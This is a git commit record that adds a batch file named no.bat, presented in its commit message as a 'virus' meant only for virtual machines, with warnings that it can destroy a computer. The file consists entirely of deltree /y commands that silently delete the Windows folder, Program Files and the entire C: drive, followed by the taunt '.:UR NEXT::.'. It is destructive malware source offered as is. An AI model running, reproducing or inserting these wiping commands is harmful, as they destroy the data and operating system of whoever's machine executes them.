01d1f488ab3d3c9d63b52593f7c6599811e27c14
oploFiles <155356171+oploFiles@users.noreply.github.com>
2024-01-01 12:31:02 +0300

    no.exe
    PLEASE DONT WORK IT ON YOUR REAL COMPUTER! IT CAN DESTROY YOUR COMPUTER! IM CRATING IT FOR TRY THIS VIRUS IN VIRTUAL MACHINE. AND PLEASE DONT WORK IT ON SCHOOL COMPUTER!

---
+++ Person/no.bat
@@ -0,0 +1,21 @@
+@echo off
+
+C:\WINDOWS\COMMAND\deltree /y c:\windows\*.*
+
+@echo off
+
+C:\WINDOWS\COMMAND\deltree /y c:\Progra~1\*.*
+
+@echo off
+
+C:\WINDOWS\COMMAND\deltree /y c:\*.*
+
+@echo off
+
+cls
+
+cls
+
+@echo .:UR NEXT::.
+
+@echo off
